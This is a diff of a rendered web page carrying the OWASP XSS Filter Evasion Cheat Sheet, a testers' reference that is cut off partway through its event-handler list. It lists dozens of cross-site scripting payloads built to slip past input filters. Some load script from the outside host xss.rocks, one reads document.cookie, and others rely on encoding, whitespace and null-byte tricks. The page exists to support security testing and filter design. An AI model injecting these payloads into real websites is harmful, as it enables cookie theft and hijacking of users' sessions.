+          <li class="md-nav__item">
+  <a href="#google-feeling-lucky-part-3" class="md-nav__link">
+    Google "feeling lucky" part 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#removing-cnames" class="md-nav__link">
+    Removing CNAMEs
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#javascript-link-location" class="md-nav__link">
+    JavaScript Link Location
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-replace-as-attack-vector" class="md-nav__link">
+    Content Replace as Attack Vector
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#assisting-xss-with-http-parameter-pollution" class="md-nav__link">
+    Assisting XSS with HTTP Parameter Pollution
+  </a>
+  
+    <nav class="md-nav" aria-label="Assisting XSS with HTTP Parameter Pollution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#content-page-source-code" class="md-nav__link">
+    Content Page Source Code
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-page-source-code" class="md-nav__link">
+    Share Page Source Code
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-page-output" class="md-nav__link">
+    Content Page Output
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#share-page-output" class="md-nav__link">
+    Share Page Output
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#character-escape-sequences" class="md-nav__link">
+    Character Escape Sequences
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#methods-to-bypass-waf-cross-site-scripting" class="md-nav__link">
+    Methods to Bypass WAF – Cross-Site Scripting
+  </a>
+  
+    <nav class="md-nav" aria-label="Methods to Bypass WAF – Cross-Site Scripting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#general-issues" class="md-nav__link">
+    General issues
+  </a>
+  
+    <nav class="md-nav" aria-label="General issues">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    Stored XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reflected-xss-in-javascript" class="md-nav__link">
+    Reflected XSS in JavaScript
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dom-based-xss" class="md-nav__link">
+    DOM-based XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-via-request-redirection" class="md-nav__link">
+    XSS via request Redirection
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf-bypass-strings-for-xss" class="md-nav__link">
+    WAF ByPass Strings for XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filter-bypass-alert-obfuscation" class="md-nav__link">
+    Filter Bypass Alert Obfuscation
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="xss-filter-evasion-cheat-sheet">XSS Filter Evasion Cheat Sheet<a class="headerlink" href="#xss-filter-evasion-cheat-sheet" title="Permanent link">&para;</a></h1>
+<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
+<p>This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS Cheat Sheet, which was at: <code>http://ha.ckers.org/xss.html</code>. That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention Cheat Sheet, the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross Site Scripting Prevention Cheat Sheet</a>, was inspired by RSnake's XSS Cheat Sheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack cheat sheet, and so the <a href="https://owasp.org/www-project-cheat-sheets/">OWASP Cheat Sheet Series</a> was born.</p>
+<h2 id="tests">Tests<a class="headerlink" href="#tests" title="Permanent link">&para;</a></h2>
+<p>This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate.</p>
+<h3 id="basic-xss-test-without-filter-evasion">Basic XSS Test Without Filter Evasion<a class="headerlink" href="#basic-xss-test-without-filter-evasion" title="Permanent link">&para;</a></h3>
+<p>This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p>
+<h3 id="xss-locator-polygot">XSS Locator (Polygot)<a class="headerlink" href="#xss-locator-polygot" title="Permanent link">&para;</a></h3>
+<p>The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to <a href="https://twitter.com/garethheyes">Gareth Heyes</a> for this <a href="https://twitter.com/garethheyes/status/997466212190781445">contribution</a>.</p>
+<p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code></p>
+<h3 id="image-xss-using-the-javascript-directive">Image XSS Using the JavaScript Directive<a class="headerlink" href="#image-xss-using-the-javascript-directive" title="Permanent link">&para;</a></h3>
+<p>Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:</p>
+<p><code>&lt;IMG SRC="javascript:alert('XSS');"&gt;</code></p>
+<h3 id="no-quotes-and-no-semicolon">No Quotes and no Semicolon<a class="headerlink" href="#no-quotes-and-no-semicolon" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC=javascript:alert('XSS')&gt;</code></p>
+<h3 id="case-insensitive-xss-attack-vector">Case Insensitive XSS Attack Vector<a class="headerlink" href="#case-insensitive-xss-attack-vector" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;</code></p>
+<h3 id="html-entities">HTML Entities<a class="headerlink" href="#html-entities" title="Permanent link">&para;</a></h3>
+<p>The semicolons are required for this to work:</p>
+<p><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code></p>
+<h3 id="grave-accent-obfuscation">Grave Accent Obfuscation<a class="headerlink" href="#grave-accent-obfuscation" title="Permanent link">&para;</a></h3>
+<p>If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:</p>
+<div class="highlight"><pre><span></span><code>&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt;
+</code></pre></div>
+<h3 id="malformed-a-tags">Malformed A Tags<a class="headerlink" href="#malformed-a-tags" title="Permanent link">&para;</a></h3>
+<p>Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \~ Verified on Chrome</p>
+<p><code>\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;</code></p>
+<p>or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script.</p>
+<p><code>\&lt;a onmouseover=alert(document.cookie)\&gt;xxs link\&lt;/a\&gt;</code></p>
+<h3 id="malformed-img-tags">Malformed IMG Tags<a class="headerlink" href="#malformed-img-tags" title="Permanent link">&para;</a></h3>
+<p>Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags:</p>
+<p><code>&lt;IMG """&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"\&gt;</code></p>
+<h3 id="fromcharcode">fromCharCode<a class="headerlink" href="#fromcharcode" title="Permanent link">&para;</a></h3>
+<p>If no quotes of any kind are allowed you can <code>eval()</code> a <code>fromCharCode</code> in JavaScript to create any XSS vector you need:</p>
+<p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p>
+<h3 id="default-src-tag-to-get-past-filters-that-check-src-domain">Default SRC Tag to Get Past Filters that Check SRC Domain<a class="headerlink" href="#default-src-tag-to-get-past-filters-that-check-src-domain" title="Permanent link">&para;</a></h3>
+<p>This will bypass most SRC domain filters. Inserting JavaScript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like <code>onblur</code>, <code>onclick</code> giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .</p>
+<p>Edited by Abdullah Hussam(@Abdulahhusam).</p>
+<p><code>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;</code></p>
+<h3 id="default-src-tag-by-leaving-it-empty">Default SRC Tag by Leaving it Empty<a class="headerlink" href="#default-src-tag-by-leaving-it-empty" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;</code></p>
+<h3 id="default-src-tag-by-leaving-it-out-entirely">Default SRC Tag by Leaving it out Entirely<a class="headerlink" href="#default-src-tag-by-leaving-it-out-entirely" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG onmouseover="alert('xxs')"&gt;</code></p>
+<h3 id="on-error-alert">On Error Alert<a class="headerlink" href="#on-error-alert" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;</code></p>
+<h3 id="img-onerror-and-javascript-alert-encode">IMG onerror and JavaScript Alert Encode<a class="headerlink" href="#img-onerror-and-javascript-alert-encode" title="Permanent link">&para;</a></h3>
+<p><code>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;</code></p>
+<h3 id="decimal-html-character-references">Decimal HTML Character References<a class="headerlink" href="#decimal-html-character-references" title="Permanent link">&para;</a></h3>
+<p>All of the XSS examples that use a javascript: directive inside of an <code>&lt;IMG</code> tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</p>
+<p><code>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</code></p>
+<h3 id="decimal-html-character-references-without-trailing-semicolons">Decimal HTML Character References Without Trailing Semicolons<a class="headerlink" href="#decimal-html-character-references-without-trailing-semicolons" title="Permanent link">&para;</a></h3>
+<p>This is often effective in XSS that attempts to look for "&amp;#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp_string =\~ s/.*\&amp;#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a HTML encoded string (I've seen this in the wild):</p>
+<p><code>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;</code></p>
+<h3 id="hexadecimal-html-character-references-without-trailing-semicolons">Hexadecimal HTML Character References Without Trailing Semicolons<a class="headerlink" href="#hexadecimal-html-character-references-without-trailing-semicolons" title="Permanent link">&para;</a></h3>
+<p>This is also a viable XSS attack against the above string $tmp_string=\~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</p>
+<p><code>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</code></p>
+<h3 id="embedded-tab">Embedded Tab<a class="headerlink" href="#embedded-tab" title="Permanent link">&para;</a></h3>
+<p>Used to break up the cross site scripting attack:</p>
+<!-- markdownlint-disable MD010-->
+<p><code>&lt;IMG SRC="jav  ascript:alert('XSS');"&gt;</code></p>
+<!-- markdownlint-enable MD010-->
+
+<h3 id="embedded-encoded-tab">Embedded Encoded Tab<a class="headerlink" href="#embedded-encoded-tab" title="Permanent link">&para;</a></h3>
+<p>Use this one to break up XSS :</p>
+<p><code>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;</code></p>
+<h3 id="embedded-newline-to-break-up-xss">Embedded Newline to Break-up XSS<a class="headerlink" href="#embedded-newline-to-break-up-xss" title="Permanent link">&para;</a></h3>
+<p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:</p>
+<p><code>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;</code></p>
+<h3 id="embedded-carriage-return-to-break-up-xss">Embedded Carriage Return to Break-up XSS<a class="headerlink" href="#embedded-carriage-return-to-break-up-xss" title="Permanent link">&para;</a></h3>
+<p>(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):</p>
+<p><code>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;</code></p>
+<h3 id="null-breaks-up-javascript-directive">Null breaks up JavaScript Directive<a class="headerlink" href="#null-breaks-up-javascript-directive" title="Permanent link">&para;</a></h3>
+<p>Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use <code>%00</code> in the URL string or if you want to write your own injection tool you can either use vim (<code>^V^@</code> will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char <code>%00</code> is much more useful and helped me bypass certain real world filters with a variation on this example:</p>
+<p><code>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out</code></p>
+<h3 id="spaces-and-meta-chars-before-the-javascript-in-images-for-xss">Spaces and Meta Chars Before the JavaScript in Images for XSS<a class="headerlink" href="#spaces-and-meta-chars-before-the-javascript-in-images-for-xss" title="Permanent link">&para;</a></h3>
+<p>This is useful if the pattern match doesn't take into account spaces in the word <code>javascript:</code> -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the <code>javascript:</code> keyword. The actual reality is you can have any char from 1-32 in decimal:</p>
+<p><code>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"&gt;</code></p>
+<h3 id="non-alpha-non-digit-xss">Non-alpha-non-digit XSS<a class="headerlink" href="#non-alpha-non-digit-xss" title="Permanent link">&para;</a></h3>
+<p>The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
+<p><code>&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p>
+<div class="highlight"><pre><span></span><code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+</code></pre></div>
+<p>Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.</p>
+<p><code>&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;</code></p>
+<h3 id="extraneous-open-brackets">Extraneous Open Brackets<a class="headerlink" href="#extraneous-open-brackets" title="Permanent link">&para;</a></h3>
+<p>Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:</p>
+<p><code>&lt;&lt;SCRIPT&gt;alert("XSS");//\&lt;&lt;/SCRIPT&gt;</code></p>
+<h3 id="no-closing-script-tags">No Closing Script Tags<a class="headerlink" href="#no-closing-script-tags" title="Permanent link">&para;</a></h3>
+<p>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the <code>\&gt;&lt;/SCRIPT&gt;</code> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:</p>
+<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;</code></p>
+<h3 id="protocol-resolution-in-script-tags">Protocol Resolution in Script Tags<a class="headerlink" href="#protocol-resolution-in-script-tags" title="Permanent link">&para;</a></h3>
+<p>This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code>&lt;/SCRIPT&gt;</code> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The ".j" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.</p>
+<p><code>&lt;SCRIPT SRC=//xss.rocks/.j&gt;</code></p>
+<h3 id="half-open-htmljavascript-xss-vector">Half Open HTML/JavaScript XSS Vector<a class="headerlink" href="#half-open-htmljavascript-xss-vector" title="Permanent link">&para;</a></h3>
+<p>Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close ">" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn't require the end ">". As a side note, this was also affective against a real world XSS filter I came across using an open ended <code>&lt;IFRAME</code> tag instead of an <code>&lt;IMG</code> tag:</p>
+<p><code>&lt;IMG SRC="</code><javascript:alert><code>('XSS')"</code></p>
+<h3 id="double-open-angle-brackets">Double Open Angle Brackets<a class="headerlink" href="#double-open-angle-brackets" title="Permanent link">&para;</a></h3>
+<p>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't:</p>
+<p><code>&lt;iframe src=http://xss.rocks/scriptlet.html &lt;</code></p>
+<h3 id="escaping-javascript-escapes">Escaping JavaScript Escapes<a class="headerlink" href="#escaping-javascript-escapes" title="Permanent link">&para;</a></h3>
+<p>When the application is written to output some user information inside of a JavaScript like the following: <code>&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <code>&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.:</p>
+<p><code>\";alert('XSS');//</code></p>
+<p>An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:</p>
+<p><code>&lt;/script&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</code></p>
+<h3 id="end-title-tag">End Title Tag<a class="headerlink" href="#end-title-tag" title="Permanent link">&para;</a></h3>
+<p>This is a simple XSS vector that closes <code>&lt;TITLE&gt;</code> tags, which can encapsulate the malicious cross site scripting attack:</p>
+<p><code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</code></p>
+<h3 id="input-image">INPUT Image<a class="headerlink" href="#input-image" title="Permanent link">&para;</a></h3>
+<p><code>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;</code></p>
+<h3 id="body-image">BODY Image<a class="headerlink" href="#body-image" title="Permanent link">&para;</a></h3>
+<p><code>&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;</code></p>
+<h3 id="img-dynsrc">IMG Dynsrc<a class="headerlink" href="#img-dynsrc" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;</code></p>
+<h3 id="img-lowsrc">IMG Lowsrc<a class="headerlink" href="#img-lowsrc" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;</code></p>
+<h3 id="list-style-image">List-style-image<a class="headerlink" href="#list-style-image" title="Permanent link">&para;</a></h3>
+<p>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:</p>
+<p><code>&lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</code></p>
+<h3 id="vbscript-in-an-image">VBscript in an Image<a class="headerlink" href="#vbscript-in-an-image" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;</code></p>
+<h3 id="livescript-older-versions-of-netscape-only">Livescript (older versions of Netscape only)<a class="headerlink" href="#livescript-older-versions-of-netscape-only" title="Permanent link">&para;</a></h3>
+<p><code>&lt;IMG SRC="livescript:[code]"&gt;</code></p>
+<h3 id="svg-object-tag">SVG Object Tag<a class="headerlink" href="#svg-object-tag" title="Permanent link">&para;</a></h3>
+<p><code>&lt;svg/onload=alert('XSS')&gt;</code></p>
+<h3 id="ecmascript-6">ECMAScript 6<a class="headerlink" href="#ecmascript-6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>Set.constructor`alert\x28document.domain\x29
+</code></pre></div>
+<h3 id="body-tag">BODY Tag<a class="headerlink" href="#body-tag" title="Permanent link">&para;</a></h3>
+<p>Method doesn't require using any variants of <code>javascript:</code> or <code>&lt;SCRIPT...</code> to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign (<code>onload=</code> != <code>onload =</code>):</p>
+<p><code>&lt;BODY ONLOAD=alert('XSS')&gt;</code></p>
+<h3 id="event-handlers">Event Handlers<a class="headerlink" href="#event-handlers" title="Permanent link">&para;</a></h3>
+<p>It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.</p>
+<p>The <a href="http://help.dottoro.com/">Dottoro Web Reference</a> also has a nice <a href="http://help.dottoro.com/ljfvvdnm.php">list of events in JavaScript</a>.</p>
+<ol>
+<li><code>FSCommand()</code> (attacker can use this when executed from within an embedded Flash object)</li>
+<li><code>onAbort()</code> (when user aborts the loading of an image)</li>
+<li><code>onActivate()</code> (when object is set as the active element)</li>
+<li><code>onAfterPrint()</code> (activates after user prints or previews print job)</li>
+<li><code>onAfterUpdate()</code> (activates on data object after updating data in the source object)</li>
+<li><code>onBeforeActivate()</code> (fires before the object is set as the active element)</li>
+<li><code>onBeforeCopy()</code> (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the <code>execCommand("Copy")</code> function)</li>
+<li><code>onBeforeCut()</code> (attacker executes the attack string right before a selection is cut)</li>
+<li><code>onBeforeDeactivate()</code> (fires right after the activeElement is changed from the current object)</li>
+<li><code>onBeforeEditFocus()</code> (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)</li>
+<li><code>onBeforePaste()</code> (user needs to be tricked into pasting or be forced into it using the <code>execCommand("Paste")</code> function)</li>
+<li><code>onBeforePrint()</code> (user would need to be tricked into printing or attacker could use the <code>print()</code> or <code>execCommand("Print")</code> function).</li>
+<li><code>onBeforeUnload()</code> (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)</li>
+<li><code>onBeforeUpdate()</code> (activates on data object before updating data in the source object)</li>
+<li><code>onBegin()</code> (the onbegin event fires immediately when the element's timeline begins)</li>
+<li><code>onBlur()</code> (in the case where another popup is loaded and window looses focus)</li>
+<li><code>onBounce()</code> (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)</li>
+<li><code>onCellChange()</code> (fires when data changes in the data provider)</li>
+<li><code>onChange()</code> (select, text, or TEXTAREA field loses focus and its value has been modified)</li>
+<li><code>onClick()</code> (someone clicks on a form)</li>
+<li><code>onContextMenu()</code> (user would need to right click on attack area)</li>
+<li><code>onControlSelect()</code> (fires when the user is about to make a control selection of the object)</li>
+<li><code>onCopy()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Copy")</code> command)</li>
+<li><code>onCut()</code> (user needs to copy something or it can be exploited using the <code>execCommand("Cut")</code> command)</li>
+<li><code>onDataAvailable()</code> (user would need to change data in an element, or attacker could perform the same function)</li>
+<li><code>onDataSetChanged()</code> (fires when the data set exposed by a data source object changes)</li>
+<li><code>onDataSetComplete()</code> (fires to indicate that all data is available from the data source object)</li>
+<li><code>onDblClick()</code> (user double-clicks a form element or a link)</li>
+<li><code>onDeactivate()</code> (fires when the activeElement is changed from the current object to another object in the parent document)</li>
+<li><code>onDrag()</code> (requires that the user drags an object)</li>
+<li><code>onDragEnd()</code> (requires that the user drags an object)</li>
+<li><code>onDragLeave()</code> (requires that the user drags an object off a valid location)</li>
+<li><code>onDragEnter()</code> (requires that the user drags an object into a valid location)</li>
+<li><code>onDragOver()</code> (requires that the user drags an object into a valid location)</li>
+<li><code>onDragDrop()</code> (user drops an object (e.g. file) onto the browser window)</li>
+<li><code>onDragStart()</code> (occurs when user starts drag operation)</li>
+<li><code>onDrop()</code> (user drops an object (e.g. file) onto the browser window)</li>
+<li><code>onEnd()</code> (the onEnd event fires when the timeline ends.</li>
+<li><code>onError()</code> (loading of a document or image causes an error)</li>
+<li><code>onErrorUpdate()</code> (fires on a databound object when an error occurs while updating the associated data in the data source object)</li>
+<li><code>onFilterChange()</code> (fires when a visual filter completes state change)</li>
+<li><code>onFinish()</code> (attacker can create the exploit when marquee is finished looping)</li>
+<li><code>onFocus()</code> (attacker executes the attack string when the window gets focus)</li>
+<li><code>onFocusIn()</code> (attacker executes the attack string when window gets focus)</li>
+<li><code>onFocusOut()</code> (attacker executes the attack string when window looses focus)</li>
+<li><code>onHashChange()</code> (fires when the fragment identifier part of the document's current address changed)</li>
+<li><code>onHelp()</code> (attacker executes the attack string when users hits F1 while the window is in focus)</li>
+<li><code>onInput()</code> (the text content of an element is changed through the user interface)</li>
+<li><code>onKeyDown()</code> (user depresses a key)</li>
+<li><code>onKeyPress()</code> (user presses or holds down a key)</li>
+<li><code>onKeyUp()</code> (user releases a key)</li>
+<li><code>onLayoutComplete()</code> (user would have to print or print preview)</li>
+<li><code>onLoad()</code> (attacker executes the attack string after the window loads)</li>
+<li><code>onLoseCapture()</code> (can be exploited by the <code>releaseCapture()</code> method)</li>
+<li><code>onMediaComplete()</code> (When a streaming media file is used, this event could fire before the file starts playing)</li>
+<li><code>onMediaError()</code> (User opens a page in the browser that contains a media file, and the event fires when there is a problem)</li>
+<li><code>onMessage()</code> (fire when the document received a message)</li>
+<li><code>onMouseDown()</code> (the attacker would need to get the user to click on an image)</li>
+<li><code>onMouseEnter()</code> (cursor moves over an object or area)</li>
+<li><code>onMouseLeave()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li>
+<li><code>onMouseMove()</code> (the attacker would need to get the user to mouse over an image or table)</li>
+<li><code>onMouseOut()</code> (the attacker would need to get the user to mouse over an image or table and then off again)</li>
+<li><code>onMouseOver()</code> (cursor moves over an object or area)</li>
+<li><code>onMouseUp()</code> (the attacker would need to get the user to click on an image)</li>
+<li><code>onMouseWheel()</code> (the attacker would need to get the user to use their mouse wheel)</li>
+<li><code>onMove()</code> (user or attacker would move the page)</li>
+<li><code>onMoveEnd()</code> (user or attacker would move the page)</li>
+<li><code>onMoveStart()</code> (user or attacker would move the page)</li>
+<li><code>onOffline()</code> (occurs if the browser is working in online mode and it starts to work offline)</li>
+<li><code>onOnline()</code> (occurs if the browser is working in offline mode and it starts to work online)</li>
+<li><code>onOutOfSync()</code> (interrupt the element's ability to play its media as defined by the timeline)</li>
+<li><code>onPaste()</code> (user would need to paste or attacker could use the <code>execCommand("Paste")</code> function)</li>
